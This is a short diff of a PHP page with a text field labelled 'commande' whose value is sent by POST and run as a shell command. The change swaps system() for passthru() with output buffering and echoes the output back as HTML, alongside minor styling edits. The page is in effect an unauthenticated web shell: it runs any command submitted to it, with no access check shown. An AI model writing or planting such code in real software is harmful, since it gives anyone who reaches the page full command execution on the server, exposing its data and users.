@@ -12,11 +12,17 @@
 */
 ?>
 
-<div class="ui-body ui-body-e"style="width: 80%; min-height: 300px; margin: auto;">
+<div class="ui-body ui-body-e"style="width: 80%; font-size: 1.3em; min-height: 300px; margin: auto;">
 		<code>
 
 <?php
-	$result = system($_POST['req']);
+
+	ob_start();
+	passthru($_POST['req']);
+	$var = ob_get_contents();
+	ob_end_clean(); //Use this instead of ob_flush()
+	$var = nl2br($var);
+	echo $var;
 
 ?>
 	
@@ -27,6 +33,6 @@
 <div data-role="fieldcontain">
 <input type="text" name="req" id="name" data-role="none" placeHolder="commande"  style="width: 80%" value="" required>
 </div>
-<input type="submit" data-inline="true" value="Envoyer" data-theme="b"/>
-</form>
-</center>
+	<input type="submit" data-inline="true" value="Envoyer" data-theme="b"/>
+	</form>
+	</center>
